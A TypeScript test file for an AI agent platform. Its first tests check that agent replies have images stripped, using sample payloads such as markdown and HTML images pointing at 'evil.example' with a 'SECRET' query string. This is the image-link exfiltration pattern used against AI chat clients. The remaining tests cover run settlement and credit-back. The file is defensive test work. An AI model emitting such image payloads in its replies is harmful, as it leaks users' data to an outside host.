import assert from 'node:assert/strict';
import { test } from 'node:test';

import {
  configureInstallationAdmission,
  resetInstallationAdmissionForTests,
} from '../src/config/installation-admission.ts';
import { scopeInstallationEnv } from '../src/config/installation-scope.ts';
import {
  configurePlatformFunding,
  resetPlatformFundingForTests,
  type CreditBackReason,
  type RunRef,
} from '../src/config/platform-funding.ts';
import type { PlatformEnv } from '../src/config/state-backend.ts';
import { CHICKPEA_TEST_TURN_AGENT_NAME } from '../src/agents/names.ts';
import { agentObjectBindingName, type AgentConversationSnapshot } from '../src/slack/bounded-agent-observation.ts';
import { withoutImages } from '../src/agents/practice-steps.ts';
import {
  cloudflareTestRunInstancePort,
  readSettledAgentSubmissionBounded,
  testRunSettlement,
  type SettledAgentSubmission,
} from '../src/state/test-run-instance.ts';
import type { UsageMicros } from '../src/usage/usage-display.ts';
import { acrossStalledReads, cutAgentObject } from './helpers/cut-agent-object.ts';
import { EVERY_PROVIDER_FUNDED, NO_RUN_FEES } from './helpers/platform-funding.ts';

function answered(text: string): SettledAgentSubmission {
  const history = { messages: [] } as unknown as AgentConversationSnapshot;
  return { outcome: 'completed', completed: { reply: { text } as never, history } };
}

test('a reply leaves the store with no image a client would fetch: each is its alt text, or its address as plain text', () => {
  const cases: Array<[string, string]> = [
    ['Here: ![chart of orders](https://evil.example/p?d=SECRET) done.', 'Here: chart of orders done.'],
    ['![](https://evil.example/p?d=SECRET)', 'https://evil.example/p?d=SECRET'],
    ['![a [nested] alt](https://evil.example/a_(1).png "title")', 'a [nested] alt'],
    ['![](<https://evil.example/a b.png>)', 'https://evil.example/a b.png'],
    ['![logo][ref] and ![][ref]\n\n[ref]: https://evil.example/r.png', 'logo and https://evil.example/r.png\n\n[ref]: https://evil.example/r.png'],
    ['![shortcut]\n\n[shortcut]: https://evil.example/s.png', 'shortcut\n\n[shortcut]: https://evil.example/s.png'],
    ['An image in an image: ![outer ![inner](https://evil.example/i)](https://evil.example/o)',
      'An image in an image: outer !\\[inner](https://evil.example/i)'],
    ['A tag: <img src="https://evil.example/t.png" alt="a tag"> and <IMG SRC=https://evil.example/u.png>',
      'A tag: a tag and https://evil.example/u.png'],
    ['Unclosed: ![never closed and <img src=x', 'Unclosed: !\\[never closed and &lt;img src=x'],
    ['Formed by a rewrite: !![[x]](https://evil.example/f)', 'Formed by a rewrite: !\\[x]'],
    ['In code too: `![x](https://evil.example/c)`', 'In code too: `x`'],
    ['A link stays a link: [orders](https://example.com/orders)', 'A link stays a link: [orders](https://example.com/orders)'],
  ];
  for (const [reply, shown] of cases) assert.equal(withoutImages(reply), shown, reply);
});

test('an answered run stores its reply without images', () => {
  const settled = testRunSettlement(answered(' Two tickets. ![](https://evil.example/p?d=SECRET) '), 'sub_1', undefined);
  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], skills: [], steps: [] });
});

test('an agent failure is credited back, as a direct message\'s is', () => {
  const failed = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
  assert.deepEqual(failed({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
});

test('a run Flue timed out, or one aborted, is a deadline credited back as a timeout', () => {
  // The usual timeout: Flue ends the submission at its own durability's timeout, before the store's deadline.
  assert.deepEqual(testRunSettlement({ outcome: 'failed', error: { type: 'submission_timeout', message: 'The submission timed out.' } }, 'sub_1', undefined),
    { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
  assert.deepEqual(testRunSettlement({ outcome: 'aborted' }, 'sub_1', undefined), { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
});

test('a test run is credited back as a direct message is: never while its installation is suspended or ended', async (t) => {
  const credits: Array<{ run: RunRef; reason: CreditBackReason }> = [];
  configurePlatformFunding({
    ...EVERY_PROVIDER_FUNDED,
    funding: async () => 'platform',
    admit: async () => 'admitted',
    charge: async () => undefined,
    ...NO_RUN_FEES,
    creditBack: async (run, reason) => {
      credits.push({ run, reason });
      return { kind: 'credited', usageMicros: 1 as UsageMicros };
    },
  });
  t.after(() => {
    resetInstallationAdmissionForTests();
    resetPlatformFundingForTests();
  });
  const port = cloudflareTestRunInstancePort(
    scopeInstallationEnv({ CHICKPEA_TENANCY: 'installation' } as PlatformEnv, { installationId: 'inst_credit' }),
  );
  // cancel_pending runs on a suspended installation, and erasure on an ended one.
  configureInstallationAdmission(async () => 'refused');
  await port.creditBack('sub_suspended', 'chickpea');
  assert.deepEqual(credits, []);
  configureInstallationAdmission(async () => 'admitted');
  await port.creditBack('sub_admitted', 'chickpea');
  assert.deepEqual(credits, [{ run: { installationId: 'inst_credit', runId: 'sub_admitted' }, reason: 'chickpea' }]);
});

// Defects caught: the settlement read joining a stalled read through the stub
// that stalled, and the reply read through it after a new stub answered.
test('a stalled settlement read is joined through a new stub, which also reads the reply', async (t) => {
  const history = {
    v: 1,
    conversationId: 'conv_1',
    offset: '0_9',
    messages: [
      { id: 'm_user', role: 'user', parts: [{ type: 'text', text: 'How many tickets?' }] },
      { id: 'm_reply', role: 'assistant', submissionId: 'sub_1', parts: [{ type: 'text', text: 'Two tickets.' }] },
    ],
    settlements: [{ submissionId: 'sub_1', outcome: 'completed' }],
  };
  const agentObject = cutAgentObject((request) => new URL(request.url).searchParams.get('view') === 'history'
    ? Response.json(history)
    : Response.json([{ type: 'stream-checkpoint' }, { type: 'submission-settled', submissionId: 'sub_1', outcome: 'completed' }]));
  const settled = await acrossStalledReads(t, () => readSettledAgentSubmissionBounded(
    { [agentObjectBindingName(CHICKPEA_TEST_TURN_AGENT_NAME)]: agentObject.namespace },
    { agentName: CHICKPEA_TEST_TURN_AGENT_NAME, instanceId: 'agent_1', submissionId: 'sub_1' },
  ));
  assert.equal(settled?.outcome, 'completed');
  assert.equal(settled?.completed?.reply.text, 'Two tickets.');
  assert.equal(agentObject.stubs(), 2);
});
